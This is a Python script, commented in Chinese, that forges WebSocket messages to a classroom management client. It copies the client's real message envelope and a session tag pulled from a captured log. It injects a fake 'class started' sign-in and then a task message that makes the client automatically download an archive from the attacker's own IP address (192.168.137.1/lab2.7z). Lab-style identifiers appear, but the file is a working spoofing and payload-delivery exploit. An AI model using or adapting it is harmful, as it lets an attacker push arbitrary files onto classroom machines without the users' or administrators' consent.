# -*- coding: utf-8 -*-
"""inject_upclass_v2.py - 【修正版】按端侧真实信封注入, 最大化成功率
真实信封(ws_frames.log 实测):
  {"cId":"<ts>","cmd":2,"from":"<userId>","gt":0,"id":"1349658","rt":1,
   "smsg":{"classRoomId":"UXHOVJJF","createTag":"...","data":"...",
           "forward":0,"senderId":0,"type":<t>,"userIds":"<userId>"},
   "tags":["<会话tag>"]}
关键修正:
  · 补 id="1349658"(课堂/桌面标识, 端侧每条消息都带)
  · 补 rt=1
  · 补 tags=["<从 WS 握手 Auth 头解析出的 tag>"]
  · from 用真实 userId(端侧自己发的消息 from 就是 userId)
"""
import io
import json
import os
import re
import time

BASE = os.path.dirname(os.path.abspath(__file__))
INJ = os.path.join(BASE, "ws_inject.txt")
WSLOG = os.path.join(BASE, "ws8889.log")
OUR = "192.168.137.1"
ROOM = "UXHOVJJF"
UID = "2112229"
DESK_ID = "1349658"          # 端侧消息里的固定 id
PAYLOAD = "lab2.7z"


def session_tag():
    """从 ws8889.log 的 WS 握手 Auth 头里取 tags"""
    try:
        with io.open(WSLOG, "r", encoding="utf-8", errors="replace") as f:
            txt = f.read()
        m = re.findall(r'"tags"\s*:\s*\[\s*"([A-Z0-9]+)"', txt)
        if m:
            return m[-1]
    except Exception:
        pass
    return "RWYZKUIF"


def env(mtype, data, cid, tag, cmd=2, frm=None, tags=None):
    return json.dumps({
        "cId": cid, "cmd": cmd, "from": frm or UID, "gt": 0,
        "id": DESK_ID, "rt": 1,
        "smsg": {"classRoomId": ROOM, "createTag": tag, "data": data,
                 "forward": 0, "senderId": 0, "type": mtype, "userIds": UID},
        "tags": tags or [session_tag()],
    }, ensure_ascii=False, separators=(",", ":"))


def inj(js, label, wait=8):
    io.open(INJ, "w", encoding="utf-8").write(js)
    print("INJ %s" % label, flush=True)
    time.sleep(wait)


def main():
    tag = session_tag()
    print("session tag = %s" % tag)
    now = int(time.time() * 1000)

    # 1) 制造上课中: type=400 code_syn_start_sign
    sign = {
        "attendClass": 2,            # 2 = UP_CLASS
        "setClassTime": True,        # 已设课堂时间
        "signType": 1, "classroomId": ROOM, "roomId": "LAB_ROOM1",
        "taskId": "LAB_T9", "userId": 2112229, "desktopId": "LAB_D9",
        "isPlay": 0, "isSilent": 1, "isSignFinish": 1,
        "isTeaStartSignTask": 1, "openAdvanceSignOut": 0, "classMode": 0,
        "childTaskId": {},
    }
    inj(env(400, json.dumps(sign, ensure_ascii=False), "179PE0001", "online_tag"),
        "type=400 UP_CLASS(attendClass=2,setClassTime=true)", 10)
    inj(env(400, json.dumps(sign, ensure_ascii=False), "179PE0002", "online_tag"),
        "type=400 重发", 8)

    # 2) 任务触发自动下载(resourceInfo.zipUrl 以 .7z 结尾 ⇒ needDecode=true)
    td = {
        "taskId": "LAB_T9", "subTaskId": "LAB_S9", "allTaskId": "LAB_T9",
        "classroomId": ROOM, "classroomName": "lab",
        "desktopId": "LAB_D9", "subDesktopId": "LAB_D9",
        "defaultDesktopId": "LAB_D9", "defaultDesktopName": "lab",
        "sourceId": "LAB_R9", "itemType": 1, "taskType": 1,
        "taskCreateMode": 1, "pptSource": 1, "isFromPPT": 0,
        "number": 1, "originTotalNumber": 1, "content": "lab",
        "memo": "", "createTime": now, "expectedSendDate": now,
        "completed": False, "showStatus": 1, "percent": 0, "progress": "0",
        "positive": 1, "negative": 0, "score": 0.0, "studyTime": 0,
        "viewedIds": "", "viewedNum": 0,
        "resourceInfo": {
            "sourceId": "LAB_R9", "taskId": "LAB_T9", "name": "lab",
            "type": 1, "zipUrl": "http://%s/%s" % (OUR, PAYLOAD),
            "createTime": now,
        },
    }
    inj(env(0, json.dumps(td, ensure_ascii=False), "179PE0003", "canvas_tag"),
        "type=0 任务(zipUrl=http://%s/%s)" % (OUR, PAYLOAD), 12)
    print("done", flush=True)


if __name__ == "__main__":
    main()
